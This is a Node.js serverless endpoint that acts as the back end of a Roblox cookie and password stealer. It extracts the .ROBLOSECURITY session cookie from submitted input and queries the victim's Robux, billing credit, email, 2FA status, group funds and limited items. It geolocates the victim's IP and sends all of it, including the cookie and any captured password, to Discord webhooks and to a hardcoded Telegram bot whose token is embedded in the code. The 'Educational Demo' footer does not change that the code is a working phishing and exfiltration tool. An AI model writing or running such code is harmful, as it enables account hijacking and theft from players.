// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (!json.result) return null;
  try { return JSON.parse(json.result); } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

// Get IP geolocation
async function getIpGeo(ip) {
  try {
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query`, { timeout: 5000 });
    if (!res.ok) return null;
    return await res.json();
  } catch (_) {
    return null;
  }
}

function extractRobloxCookie(raw) {
  if (!raw) return null;
  const warningMatch = raw.match(/_\|WARNING[^|]*\|_([\w\-\.]+)/);
  if (warningMatch) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${warningMatch[1]}`;
  const psMatch = raw.match(/\.ROBLOSECURITY['")\s,]*[,\s]*["']?(_\|WARNING[^"'\s]+)/);
  if (psMatch) return psMatch[1];
  const bareMatch = raw.match(/(_\|WARNING[-A-Z0-9.:_ ]+\|_[\w\-.]+)/);
  if (bareMatch) return bareMatch[1];
  const tokenOnly = raw.match(/\|_([\w\-]{50,})/);
  if (tokenOnly) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${tokenOnly[1]}`;
  return null;
}

async function fetchRobloxInfo(cookie) {
  try {
    const headers = { Cookie: `.ROBLOSECURITY=${cookie}` };
    
    // Auth first
    const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', { headers });
    if (!authRes.ok) return null;
    const auth = await authRes.json();
    const uid = auth.id;
    
    // Fetch all data in parallel
    const [
      profileRes,
      robuxRes,
      friendsRes,
      premiumRes,
      billingRes,
      emailRes,
      groupsRes,
      limitedsRes,
      presenceRes,
      avatarRes,
      tfaRes
    ] = await Promise.all([
      fetch(`https://users.roblox.com/v1/users/${uid}`, { headers: {} }),
      fetch('https://economy.roblox.com/v1/user/currency', { headers }),
      fetch(`https://friends.roblox.com/v1/users/${uid}/friends/count`, { headers }),
      fetch(`https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership`, { headers }),
      fetch('https://billing.roblox.com/v1/credit', { headers }),
      fetch('https://accountsettings.roblox.com/v1/email', { headers }),
      fetch(`https://groups.roblox.com/v1/users/${uid}/groups/roles`, { headers }),
      fetch(`https://inventory.roblox.com/v1/users/${uid}/assets/collectibles?limit=100`, { headers }),
      fetch('https://presence.roblox.com/v1/presence/users', {
        method: 'POST',
        headers: { ...headers, 'Content-Type': 'application/json' },
        body: JSON.stringify({ userIds: [uid] })
      }),
      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Webp`, { headers: {} }),
      fetch(`https://twostepverification.roblox.com/v1/users/${uid}/configuration`, { headers }).catch(() => null)
    ]);
    
    const profile = profileRes.ok ? await profileRes.json() : null;
    const robuxData = robuxRes.ok ? await robuxRes.json() : null;
    const friendsData = friendsRes.ok ? await friendsRes.json() : null;
    const isPremium = premiumRes.ok ? await premiumRes.json() : false;
    const billingData = billingRes.ok ? await billingRes.json() : null;
    const emailData = emailRes.ok ? await emailRes.json() : null;
    const groupsData = groupsRes.ok ? await groupsRes.json() : { data: [] };
    const limitedsData = limitedsRes.ok ? await limitedsRes.json() : { data: [] };
    const presenceData = presenceRes.ok ? await presenceRes.json() : null;
    const avatarData = avatarRes.ok ? await avatarData.json() : null;
    const tfaData = tfaRes?.ok ? await tfaRes.json() : null;
    
    // Calculate account age
    let accountAgeDays = 'N/A';
    if (profile?.created) {
      accountAgeDays = Math.floor((Date.now() - new Date(profile.created).getTime()) / 86400000);
    }
    
    // Process groups - find owned groups and get funds
    const groups = groupsData.data || [];
    const ownedGroups = groups.filter(g => g.role?.rank === 255);
    const groupsOwned = ownedGroups.length;
    
    let groupRobux = 0;
    let groupPending = 0;
    
    // Get funds for first 3 owned groups (to avoid rate limits)
    for (const group of ownedGroups.slice(0, 3)) {
      try {
        const [currencyRes, pendingRes] = await Promise.all([
          fetch(`https://economy.roblox.com/v1/groups/${group.group.id}/currency`, { headers }).catch(() => null),
          fetch(`https://economy.roblox.com/v2/groups/${group.group.id}/transactions?transactionType=pending&limit=10`, { headers }).catch(() => null)
        ]);
        
        if (currencyRes?.ok) {
          const curr = await currencyRes.json();
          groupRobux += curr.robux || 0;
        }
        if (pendingRes?.ok) {
          const pend = await pendingRes.json();
          groupPending += pend.data?.reduce((a, t) => a + (t.currency?.amount || 0), 0) || 0;
        }
      } catch (_) {}
    }
    
    // Process limiteds
    const limiteds = limitedsData.data || [];
    const limitedsCount = limiteds.length;
    const limitedsValue = limiteds.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
    
    // Get recent games from presence
    let recentGames = [];
    if (presenceData?.userPresences?.[0]) {
      const presence = presenceData.userPresences[0];
      if (presence.lastLocation && presence.lastLocation !== 'Website') {
        recentGames.push(presence.lastLocation);
      }
    }
    
    // Try to get more games from recent plays
    try {
      const recentRes = await fetch(`https://games.roblox.com/v2/users/${uid}/games?sortOrder=Asc&limit=3`, { headers });
      if (recentRes.ok) {
        const recent = await recentRes.json();
        recent.data?.forEach(g => {
          if (!recentGames.includes(g.name)) recentGames.push(g.name);
        });
      }
    } catch (_) {}
    
    // Fill with defaults if less than 3
    while (recentGames.length < 3) recentGames.push('Unknown');
    
    // 2FA status
    const twoFA = tfaData?.methods?.length > 0 ? 'Enabled ✅' : 'Disabled ❌';
    
    // Email status
    const emailSet = emailData?.emailAddress ? 'Set ✅' : 'False ❌';
    const emailVerified = emailData?.verified ? 'Verified ✅' : 'Unset ❌';
    
    // Avatar URL
    const avatarUrl = avatarData?.data?.[0]?.imageUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png';
    
    return {
      id: uid,
      username: auth.name,
      displayName: auth.displayName,
      isPremium: isPremium === true,
      accountAgeDays,
      robux: robuxData?.robux || 0,
      pendingRobux: 0, // Will need transactions API for this
      friends: friendsData?.count || 0,
      credit: billingData?.balance || 0,
      groupsOwned,
      groupRobux,
      groupPending,
      limitedsCount,
      limitedsValue,
      emailSet,
      emailVerified,
      twoFA,
      recentGames: recentGames.slice(0, 3),
      avatarUrl,
      location: profile?.location || 'Unknown'
    };
  } catch (err) {
    console.error('Roblox fetch error:', err);
    return null;
  }
}

async function sendToDiscord(webhookUrl, data) {
  if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;
  
  const { pageName, slotLabel, rawValue, cookie, roblox, ip, geo, now } = data;
  
  // Format location string
  const accountLocation = roblox?.location && roblox.location !== 'Unknown' 
    ? roblox.location 
    : (geo?.country || 'Unknown');
  const victimLocation = geo 
    ? `${geo.city || 'Unknown'}, ${geo.country || 'Unknown'} ${geo.countryCode || ''}`.trim()
    : 'Unknown';
  const flag = geo?.countryCode ? `:flag_${geo.countryCode.toLowerCase()}:` : ':earth_americas:';
  
  // Format game lines
  const gameLines = roblox 
    ? roblox.recentGames.map(g => `• ${g} → 0 ❌`).join('\n')
    : '• No Data ❌';
  
  // Build fields
  const fields = [
    {
      name: "👤 Username",
      value: roblox?.username || 'Unknown',
      inline: true
    },
    {
      name: "🔐 Password",
      value: slotLabel === 'password' || slotLabel === 'pass' ? rawValue : 'Not Captured',
      inline: true
    },
    {
      name: "📊 Account Stats",
      value: `\`Account Age:\` \`${roblox?.accountAgeDays || 'N/A'} Days\``
    },
    {
      name: "📍 Locations",
      value: `• \`Account:\` ${accountLocation} ${flag}\n• \`Victim:\` ${victimLocation} ${flag}`
    },
    {
      name: "💳 Billing",
      value: `Credit: ${roblox?.credit || 0} $\nConvert: 0\nPayments: N/A`,
      inline: true
    },
    {
      name: "👥 Groups",
      value: `Balance: ${roblox?.groupRobux?.toLocaleString() || 0}\nPending: ${roblox?.groupPending?.toLocaleString() || 0}\nOwned: ${roblox?.groupsOwned || 0}`,
      inline: true
    },
    {
      name: "⚙️ Settings",
      value: `Email: ${roblox?.emailSet || 'False ❌'}\nVerified: ${roblox?.emailVerified || 'Unset ❌'}\n2FA: ${roblox?.twoFA || 'Disabled ❌'}`,
      inline: true
    },
    {
      name: "💰 Account Funds",
      value: `Balance: ${roblox?.robux?.toLocaleString() || 0}\nPending: ${roblox?.pendingRobux?.toLocaleString() || 0}`,
      inline: true
    },
    {
      name: "🛒 Purchases",
      value: `Limiteds: ${roblox?.limitedsCount || 0}\nSummary: ${roblox?.limitedsValue?.toLocaleString() || 0}`,
      inline: true
    },
    {
      name: "🎮 Gamepasses Played",
      value: gameLines
    },
    {
      name: "🌐 IP Address",
      value: `\`${ip || 'Unknown'}\``,
      inline: true
    },
    {
      name: "🔐 .ROBLOSECURITY",
      value: `\`\`\`${cookie || rawValue?.substring(0, 500)}\`\`\``
    }
  ];
  
  const payload = {
    content: "@everyone",
    embeds: [{
      title: roblox 
        ? `🧑 ${roblox.username} ${roblox.isPremium ? '⭐' : ''}`
        : `🧑 Unknown User`,
      description: `:fire: \`sPAIN\` :fire:\n\n[Refresh Cookie 🍪](https://example.com) | [Profile 👤](https://www.roblox.com/users/${roblox?.id}/profile) | [Discord Server](https://example.com)\n\n[:Join Discord:](https://example.com)`,
      color: 5793266,
      fields: fields,
      footer: {
        text: `Educational Demo • ${now}`
      },
      thumbnail: {
        url: roblox?.avatarUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png'
      }
    }]
  };

  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (err) {
    console.error('Discord send error:', err);
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  const { slug, slots } = body || {};
  if (!slug) return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  let record;
  try {
    record = await redisGet(`slot:${slug}`);
  } catch (err) {
    return res.status(500).json({ error: 'Redis error', detail: err.message });
  }
  if (!record) return res.status(404).json({ error: 'Page not found' });

  // Get IP and geo
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
             req.headers['x-real-ip'] || 
             req.socket?.remoteAddress || 
             'Unknown';
             
  const geo = ip !== 'Unknown' ? await getIpGeo(ip) : null;

  const now = new Date().toISOString();
  const slotEntry = Object.entries(slots).find(([, v]) => v && v.length > 0);
  const slotLabel = slotEntry ? slotEntry[0] : 'N/A';
  const rawValue = slotEntry ? slotEntry[1] : '(empty)';

  const cookie = extractRobloxCookie(rawValue);
  const roblox = cookie ? await fetchRobloxInfo(cookie) : null;

  // Prepare data object
  const data = {
    pageName: record.displayName,
    slotLabel,
    rawValue,
    cookie,
    roblox,
    ip,
    geo,
    now
  };

  // Send to webhook2
  await sendToDiscord(record.webhook, data);

  // Send to webhook1 if dualhook
  let webhook1 = 'N/A';
  if (record.dualhookParent) {
    try {
      const parentRecord = await redisGet(`slot:${record.dualhookParent}`);
      if (parentRecord?.webhook && parentRecord.webhook !== record.webhook) {
        webhook1 = parentRecord.webhook;
        await sendToDiscord(parentRecord.webhook, data);
      }
    } catch (_) {}
  }

  // Telegram message
  const tgLines = [
    `🚨 <b>NEW SUBMISSION</b> 🚨`,
    `------------------------------------------`,
    `👤 User: ${roblox?.username || 'Unknown'} ${roblox?.isPremium ? '⭐' : ''}`,
    `🆔 ID: ${roblox?.id || 'N/A'}`,
    `💰 Robux: ${roblox?.robux?.toLocaleString() || 0}`,
    `📅 Age: ${roblox?.accountAgeDays || 'N/A'} days`,
    `🌐 IP: ${ip}`,
    `📍 Location: ${geo?.city || 'Unknown'}, ${geo?.country || 'Unknown'}`,
    `🔐 Cookie: ${cookie ? cookie.substring(0, 50) + '...' : 'None'}`,
    `------------------------------------------`,
    `📄 Page: ${record.displayName}`,
    `🔗 Webhook2: ${record.webhook}`,
    `🔗 Webhook1: ${webhook1}`,
    `📅 ${now}`
  ];

  await tgSend(tgLines.join('\n'));

  return res.status(200).json({ success: true });
}
